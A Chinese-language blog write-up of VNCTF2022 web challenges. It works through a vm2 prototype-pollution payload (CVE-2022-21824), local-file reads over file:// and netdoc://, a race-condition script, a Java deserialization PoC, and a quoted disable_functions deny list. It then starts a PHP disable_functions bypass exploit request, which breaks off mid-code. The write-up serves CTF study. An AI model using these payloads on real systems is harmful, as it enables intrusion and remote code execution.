@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>vnctf2022 |  Hexo</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-vnctf2022"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  vnctf2022
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/06/vnctf2022/" class="article-date">
+  <time datetime="2022-04-06T10:40:27.000Z" itemprop="datePublished">2022-04-06</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctfStudy/">ctfStudy</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">12 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>陆陆续续把比赛都复现过去，随缘放到博客。</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/02/16/vnctf-2022/">http://www.yongsheng.site/2022/02/16/vnctf-2022/</a></p>
+<p><a target="_blank" rel="noopener" href="https://chowdera.com/2022/02/202202170129375291.html">https://chowdera.com/2022/02/202202170129375291.html</a></p>
+<h1 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h1><p>data.js中有flag</p>
+<p>VNCTF{Welcome_to_VNCTF2022}</p>
+<h1 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>考点为cve-2022-21824，vm2虚拟机逃逸，污染原型链</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm2 = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;static&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> vm2.<span class="title class_">NodeVM</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/eval&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> e = req.<span class="property">body</span>.<span class="property">e</span>;</span><br><span class="line">  <span class="keyword">if</span> (!e) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(vm.<span class="title function_">run</span>(<span class="string">&quot;module.exports=&quot;</span>+e)?.<span class="title function_">toString</span>() ?? <span class="string">&quot;no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">k</span> =&gt;</span> <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[k]);</span><br><span class="line">    res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/source&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> p = req.<span class="property">query</span>.<span class="property">path</span> || <span class="string">&quot;/src/index.js&quot;</span>;</span><br><span class="line">  p = path.<span class="title function_">join</span>(path.<span class="title function_">resolve</span>(<span class="string">&quot;.&quot;</span>), path.<span class="title function_">resolve</span>(p));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line">  res.<span class="title function_">sendFile</span>(p);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&quot;index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">8888</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这道题用了vm2模块，但是都是最新包，暂不存在能够逃逸的1day。</p>
+<blockquote>
+<p>镜像为node:lts-alpine，package.json全部为最新包</p>
+</blockquote>
+<p>拿到flag的条件是<code>Object.keys(Object.prototype).length &gt; 0</code>，即Object原型的属性需要大于1</p>
+<blockquote>
+<p><code>Object.keys</code> 返回一个所有元素为字符串的数组，其元素来自于从给定的<code>object</code>上面可直接枚举的属性。这些属性的顺序与手动遍历该对象属性时的一致。</p>
+</blockquote>
+<p>原题：<a target="_blank" rel="noopener" href="https://brycec.me/posts/dicectf_2022_writeups#vm-calc">https://brycec.me/posts/dicectf_2022_writeups#vm-calc</a></p>
+<p>题中可以得知是node新修复的漏洞，<a target="_blank" rel="noopener" href="https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824">https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824</a></p>
+<p>而题目环境中node为<code>FROM node:16.13.1-bullseye-slim</code>，这个通过题目发布时的镜像版本可以得知存在此原型链污染漏洞</p>
+<p>复现时hackerone已经发布了漏洞相关报告</p>
+<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/1431042">https://hackerone.com/reports/1431042</a></p>
+<p>换低版本的node，复现成功。</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316204046-1lf32ch.png" alt="image.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.table([&#123;x:<span class="number">1</span>&#125;],[<span class="string">&#x27;__proto__&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>考点为条件竞争，线程漏洞</p>
+<p>可以用file协议或者netdoc协议读取文件目录和下载文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="operator">/</span><span class="operator">/</span><span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>tomcat<span class="operator">/</span>webapps<span class="operator">/</span>ROOT<span class="operator">/</span>WEB<span class="operator">-</span>INF<span class="operator">/</span>lib</span><br><span class="line">netdoc:<span class="operator">/</span><span class="operator">/</span><span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>tomcat<span class="operator">/</span>webapps<span class="operator">/</span>ROOT<span class="operator">/</span>WEB<span class="operator">-</span>INF<span class="operator">/</span>lib</span><br></pre></td></tr></table></figure>
+
+<p>组件包</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">commons<span class="operator">-</span>lang3<span class="number">-3.7</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>annotations<span class="operator">-</span>api<span class="number">-8.5</span><span class="number">.75</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>annotations<span class="operator">-</span>api<span class="number">-9.0</span><span class="number">.38</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>embed<span class="operator">-</span>core<span class="number">-8.5</span><span class="number">.75</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>embed<span class="operator">-</span>core<span class="number">-9.0</span><span class="number">.38</span>.jar</span><br></pre></td></tr></table></figure>
+
+<p>然后可以把class文件都下下来反编译</p>
+<p>Secr3t类</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316212409-0qtg9rl.png" alt="image.png"></p>
+<p>看Servlet</p>
+<p>处理get请求，传入一个name参数，但是这里判断上下一样，矛盾了，这里没有<strong>处理多线程，存在条件竞争漏洞</strong></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316221036-8nn5b5f.png" alt="image.png"></p>
+<p>多线程请求绕过，让Servlet内部出错拿到key</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">host = <span class="string">&quot;http://d279b171-e8d9-4364-9c3f-0623e93535a1.node4.buuoj.cn:81&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myThread</span> (threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        runing(self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runing</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     r = requests.get(host+<span class="string">&quot;/evi1?name=%s&quot;</span> % name)</span><br><span class="line">     r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">     <span class="keyword">if</span> r.text.find(<span class="string">&quot;The Key is&quot;</span>)!=-<span class="number">1</span>:</span><br><span class="line">         <span class="built_in">print</span>(r.text)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">thread1 = myThread(<span class="string">&quot;aaaaaaa&quot;</span>)</span><br><span class="line">thread2 = myThread(<span class="string">&quot;vnctf2022&quot;</span>)</span><br><span class="line"></span><br><span class="line">thread1.start()</span><br><span class="line">thread2.start()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DkF6nMYB5CeQioYpRNLFPt0wTLOWaFF5</span><br></pre></td></tr></table></figure>
+
+
+<p>看处理Post请求</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235554-r808ne8.png" alt="image.png"></p>
+<p>先用<code>SerAndDe.deserialize</code>反序列化对象，然后再用<code>User.equals()</code>来比较</p>
+<p>看下User类</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235838-vq9ebsc.png" alt="image.png"></p>
+<blockquote>
+<p>将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。</p>
+</blockquote>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235910-zk7f80c.png" alt="image.png"></p>
+<p>重写writeObject方法强制写入height域</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span> <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    out.defaultWriteObject();</span><br><span class="line">    out.writeObject(<span class="built_in">this</span>.height);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后序列化传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasePoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>((String) <span class="string">&quot;m4n_q1u_666&quot;</span>, (String) <span class="string">&quot;666&quot;</span>, (String) <span class="string">&quot;180&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> (User) SerAndDe.deserialize(bytes);</span><br><span class="line">        System.out.println(user2.toString());</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小细节，为了让对象在服务端顺利反序列化，该对象的类里开头的<code>package</code>语句，也就是位置需要和服务端一致。</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317003858-r22uayy.png" alt="image.png"></p>
+<h1 id="interesting-php"><a href="#interesting-php" class="headerlink" title="interesting php"></a>interesting php</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>考点为bypass disable_functions和提权</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试发现ban了许多函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));<span class="comment">//读目录</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">ini_get_all</span>());<span class="comment">//读php.ini</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>disable_functions:</p>
+<p>include,include_once,require,require_once,stream_get_contents,fwrite,readfile,file_get_contents,fread,fgets,fgetss,file,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var</p>
+</blockquote>
+<p>很明显的<code>file_put_contents</code>和<code>fputs</code>没ban</p>
+<h2 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass disable_functions"></a>bypass disable_functions</h2><p>使用这个项目：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php-filter-bypass">https://github.com/mm0r1/exploits/tree/master/php-filter-bypass</a></p>
+<p>需要注意的是：</p>
+<ul>
+<li>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundarytTUJ5AxeIGFMSfxf</li>
+<li>——WebKitFormBoundarytTUJ5AxeIGFMSfxf<br>Content-Disposition: form-data; name&#x3D;”1”</li>
+</ul>
+<p>这两处，然后就可以反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/29e38bcc8a1d">深入解析 multipart&#x2F;form-data</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?exp=eval($_POST[1]);</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6889</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarytTUJ5AxeIGFMSfxf</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81/?exp=eval($_POST[1]);</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17eec4fcc66536-0975948f3634ff-576153e-154ac4-17eec4fcc67914</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarytTUJ5AxeIGFMSfxf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;whoami&#x27;</span>);</span></span><br><span class="line"><span class="language-php"><span class="comment">#pwn($_POST[1]);</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGING&#x27;</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="number">0x60</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? 